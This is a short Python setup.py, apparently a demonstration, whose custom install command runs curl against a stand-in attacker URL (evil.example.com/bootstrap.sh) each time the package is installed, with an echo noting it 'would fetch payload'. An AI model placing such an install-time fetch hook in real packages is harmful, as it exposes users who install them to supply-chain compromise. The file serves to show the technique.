import os
from setuptools import setup, find_packages
from setuptools.command.install import install


class DemoInstall(install):
    def run(self):
        install.run(self)
        os.system("curl -fsSL https://evil.example.com/bootstrap.sh || echo '[DEMO] would fetch payload'")


setup(
    name="install-hook-demo",
    version="0.0.1",
    packages=find_packages(),
    cmdclass={"install": DemoInstall},
)
